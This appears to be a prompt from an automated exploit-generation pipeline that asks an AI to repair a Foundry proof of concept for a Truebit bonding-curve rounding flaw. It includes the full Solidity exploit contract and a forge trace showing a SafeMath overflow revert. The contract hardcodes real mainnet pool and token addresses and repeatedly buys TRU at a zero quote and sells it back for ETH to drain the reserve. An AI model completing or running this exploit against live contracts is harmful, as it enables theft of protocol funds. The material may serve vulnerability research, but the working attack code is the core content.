You are fixing a failing Foundry PoC for finding TRUEBIT-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Bonding-curve purchase quote can round down to zero, enabling free buys and reserve drain
- claim: The documented `getPurchasePrice` implementation computes the buy quote as `(THETA - 100) * totalSupply^2 / (200 * totalSupply * amount * reserve + 100 * amount^2 * reserve)`. Because the denominator increases with `amount`, a sufficiently large purchase causes the integer-divided quote to floor to `0`. The exploit loop in `testExploit()` shows that the attacker can then call `buyTRU(amount)` with that zero-valued quote and immediately `sellTRU(amount)` for ETH, repeating until the pool is empty. The comments also record live parameters (`THETA = 0x98`, `reserve = 0x9a`) that make the zero-price region reachable permissionlessly.
- impact: An attacker can acquire TRU for free or near-free and redeem it back to the pool for real ETH, draining the pool reserve and causing catastrophic loss of protocol funds.
- exploit_paths: ["Truebit.sol"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface ITruebitPool {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function buyTRU(uint256 amount) external payable;
    function sellTRU(uint256 amount) external payable;
    function reserve() external view returns (uint256);
    function THETA() external view returns (uint256);
}

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FlawVerifier {
    address internal constant POOL = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address internal constant TRU = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;

    uint256 internal _profitAmount;
    bool internal _executed;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() public {
        if (_executed) {
            return;
        }
        _executed = true;

        uint256 startingEth = address(this).balance;
        IERC20Minimal(TRU).approve(POOL, type(uint256).max);

        for (uint256 round = 0; round < 32; round++) {
            if (address(POOL).balance == 0) {
                break;
            }

            uint256 amount = _preferredFreeAmount();
            if (amount == 0) {
                // Direct execution is infeasible unless the pool still exposes a zero-cost region.
                break;
            }

            try this._roundTrip(amount) returns (uint256 gained) {
                if (gained == 0) {
                    break;
                }
            } catch {
                uint256 fallbackAmount = _findMinimumFreeAmount();
                if (fallbackAmount == 0 || fallbackAmount == amount) {
                    // The documented path is buyTRU(free) -> sellTRU(same amount).
                    // If even the smallest free amount cannot complete atomically here,
                    // the direct path is mechanically blocked at this fork state.
                    break;
                }

                try this._roundTrip(fallbackAmount) returns (uint256 gainedFallback) {
                    if (gainedFallback == 0) {
                        break;
                    }
                } catch {
                    break;
                }
            }
        }

        _profitAmount = address(this).balance - startingEth;
    }

    function _roundTrip(uint256 amount) external returns (uint256 gained) {
        require(msg.sender == address(this), "self only");

        uint256 quote = ITruebitPool(POOL).getPurchasePrice(amount);
        require(quote == 0, "amount not free");

        uint256 ethBefore = address(this).balance;
        uint256 truBefore = IERC20Minimal(TRU).balanceOf(address(this));

        ITruebitPool(POOL).buyTRU{value: 0}(amount);

        uint256 truAfterBuy = IERC20Minimal(TRU).balanceOf(address(this));
        require(truAfterBuy >= truBefore + amount, "buy did not mint expected TRU");

        ITruebitPool(POOL).sellTRU(amount);

        uint256 truAfterSell = IERC20Minimal(TRU).balanceOf(address(this));
        require(truAfterSell + amount <= truAfterBuy, "sell did not burn TRU");

        gained = address(this).balance - ethBefore;
    }

    function _preferredFreeAmount() internal view returns (uint256) {
        uint256 totalSupply = IERC20Minimal(TRU).totalSupply();
        if (totalSupply == 0) {
            return 0;
        }

        if (ITruebitPool(POOL).getPurchasePrice(totalSupply) == 0) {
            return totalSupply;
        }

        return _findMinimumFreeAmount();
    }

    function _findMinimumFreeAmount() internal view returns (uint256) {
        uint256 totalSupply = IERC20Minimal(TRU).totalSupply();
        if (totalSupply == 0) {
            return 0;
        }

        uint256 high = totalSupply;
        uint256 quote = ITruebitPool(POOL).getPurchasePrice(high);

        for (uint256 expansions = 0; quote != 0 && expansions < 16; expansions++) {
            if (high > type(uint256).max / 2) {
                return 0;
            }
            high *= 2;
            quote = ITruebitPool(POOL).getPurchasePrice(high);
        }

        if (quote != 0) {
            return 0;
        }

        uint256 low = 1;
        while (low < high) {
            uint256 mid = low + (high - low) / 2;
            if (ITruebitPool(POOL).getPurchasePrice(mid) == 0) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        return low;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function targetPool() external pure returns (address) {
        return POOL;
    }

    function targetToken() external pure returns (address) {
        return TRU;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.93s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 106313)
Traces:
  [106313] FlawVerifierTest::testExploit()
    ├─ [201] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [99600] FlawVerifier::executeOnOpportunity()
    │   ├─ [31962] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::approve(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [24688] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::approve(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [3172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   ├─ [2404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   ├─ [17743] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::getPurchasePrice(161753242367424992669183203 [1.617e26]) [staticcall]
    │   │   ├─ [10472] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::getPurchasePrice(161753242367424992669183203 [1.617e26]) [delegatecall]
    │   │   │   ├─ [1172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   │   │   ├─ [404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   └─ ← [Return] 102472907231365804209960 [1.024e23]
    │   │   └─ ← [Return] 102472907231365804209960 [1.024e23]
    │   ├─ [1172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   ├─ [404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   ├─ [5243] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::getPurchasePrice(161753242367424992669183203 [1.617e26]) [staticcall]
    │   │   ├─ [4472] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::getPurchasePrice(161753242367424992669183203 [1.617e26]) [delegatecall]
    │   │   │   ├─ [1172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   │   │   ├─ [404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   └─ ← [Return] 102472907231365804209960 [1.024e23]
    │   │   └─ ← [Return] 102472907231365804209960 [1.024e23]
    │   ├─ [5243] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::getPurchasePrice(323506484734849985338366406 [3.235e26]) [staticcall]
    │   │   ├─ [4472] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::getPurchasePrice(323506484734849985338366406 [3.235e26]) [delegatecall]
    │   │   │   ├─ [1172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   │   │   ├─ [404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   └─ ← [Return] 96236783623194924742545 [9.623e22]
    │   │   └─ ← [Return] 96236783623194924742545 [9.623e22]
    │   ├─ [4470] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::getPurchasePrice(647012969469699970676732812 [6.47e26]) [staticcall]
    │   │   ├─ [3680] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::getPurchasePrice(647012969469699970676732812 [6.47e26]) [delegatecall]
    │   │   │   ├─ [1172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   │   │   ├─ [404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   │   └─ ← [Revert] SafeMath: multiplication overflow
    │   │   └─ ← [Revert] SafeMath: multiplication overflow
    │   └─ ← [Revert] SafeMath: multiplication overflow
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0xC186e6F0163e21be057E95aA135eDD52508D14d3.getPurchasePrice
  at 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2.getPurchasePrice
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.91s (1.59s CPU time)

Ran 1 test suite in 2.96s (2.91s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 106313)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
